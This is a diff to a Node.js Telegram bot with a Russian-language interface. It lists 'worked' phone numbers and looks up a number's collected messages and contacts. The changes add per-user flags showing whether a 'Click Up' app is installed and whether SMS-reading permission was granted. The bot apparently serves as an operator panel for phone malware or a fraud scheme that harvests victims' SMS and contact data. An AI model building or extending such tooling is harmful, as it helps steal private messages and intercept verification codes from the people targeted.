@@ -7,7 +7,7 @@ const server = require('./requests/Server')
 const main_keyboard = {
     reply_markup: {
         keyboard: [
-            [{ text: 'Просмотреть отработанные номера' }, { text: 'Инфа по номеру' }],
+            [{ text: 'Просмотреть отработанные номера' }],
         ],
         resize_keyboard: true,
     }
@@ -19,15 +19,18 @@ bot.onText(/\/start/, (msg) => {
 bot.onText(/Просмотреть отработанные номера/, async (msg) => {
     const chatId = msg.chat.id;
     const options = {
-        parse_mode: 'MarkdownV2',
+        parse_mode: 'Markdown',
         reply_markup: {
             remove_keyboard: false
         }
     };
     const users = await server.getUsers();
     const userMessages = users.map((element) => {
-        const user_id = "`" + element.ID + "`"; // Изменение формата сообщения
-        return `${user_id}\n`;
+        console.log(element)
+        const user_id = '`' + element.ID + '`';
+        const isClickApp = element.isClickApp;
+        const permissionSms = element.permissionSms;
+        return `${user_id}\nClick Up - ${isClickApp ? "Установлено" : "Не Установлено"}\nЧтение СМС - ${permissionSms ? "Дано" : "Не дано"}\n\n`;
     })
     const messagesToSendusers = userMessages;
     const pageSizeusers = 7;
@@ -121,6 +124,7 @@ bot.onText(/Инфа по номеру/, async (msg) => {
             bot.once('message', async (msg) => {
                 const phoneNumber = msg.text;
                 const userdataByPhone = await server.getUserData(phoneNumber);
+                console.log(userdataByPhone)
                 const databtns = []
                 var appMessages = ''
                 var contactMessages = ''
